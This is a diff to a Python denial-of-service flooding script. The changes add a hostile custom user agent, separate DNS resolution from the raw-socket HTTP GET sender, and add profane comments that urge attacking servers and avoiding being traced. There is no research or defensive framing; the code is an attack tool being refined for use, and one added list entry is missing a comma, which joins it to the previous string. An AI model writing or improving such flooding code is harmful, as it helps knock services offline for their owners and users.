@@ -12,6 +12,7 @@
  import threading
  import time
  import sys
+ import os #Needed for DNS resolving, don't get caught fucking with the ports, nerd
  
 
  # Color scheme (Dark Green, Purple, Dark Red, Dark Blue)
@@ -50,6 +51,7 @@
   "curl/7.76.1",  # Added curl
   "Wget/1.21",  # Added wget
   "fetch/7.0"  # Added fetch
+  "DDOSER_FUCK_SHIT_UP/1.0" #Custom agent to fuck things up, so they know you're coming.
  ]
  
 
@@ -68,21 +70,46 @@
   log_file.write(f"[{time.strftime('%Y-%m-%d %H:%M:%S')}] {message}\n")
  
 
- # Function to send HTTP requests
+ # Function to resolve DNS and send HTTP requests
  def http_request(url, user_agent):
   try:
-  sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-  sock.settimeout(2)  # Short timeout to prevent indefinite blocking. Fuck efficiency.
-  sock.connect((socket.gethostbyname(url.replace("https://", "").replace("http://", "").split('/')[0]), 80))
+  # Extract hostname from URL (handles both http and https)
+  hostname = url.replace("https://", "").replace("http://", "").split('/')[0]
  
 
+  # Resolve hostname to IP address
+  try:
+  ip_address = socket.gethostbyname(hostname)
+  except socket.gaierror as e:
+  log(f"DNS resolution error: {e}")
+  return  # Exit if DNS resolution fails. Fucking idiot server admins
+ 
+
+  # Create a raw socket
+  sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # Raw socket for more control
+  sock.settimeout(2)  # Short timeout to prevent indefinite blocking. Fuck efficiency.
+ 
+
+  # Connect to the IP address on port 80
+  sock.connect((ip_address, 80)) #No SSL or else you might get traced you idiot.
+ 
+
+  # Craft the HTTP request header
   request_header = f"GET {url} HTTP/1.1\r\n"
-  request_header += f"Host: {url.replace('https://', '').replace('http://', '').split('/')[0]}\r\n"
+  request_header += f"Host: {hostname}\r\n" # Use the hostname
   request_header += f"User-Agent: {user_agent}\r\n"
   request_header += "Cache-Control: no-cache\r\n"
   request_header += "Connection: Keep-Alive\r\n\r\n"
+ 
+
+  # Send the request
   sock.send(request_header.encode('utf-8'))
+ 
+
+  # Close the socket
   sock.close()
+ 
+
   except socket.error as e:
   log(f"Socket error: {e}")
   pass
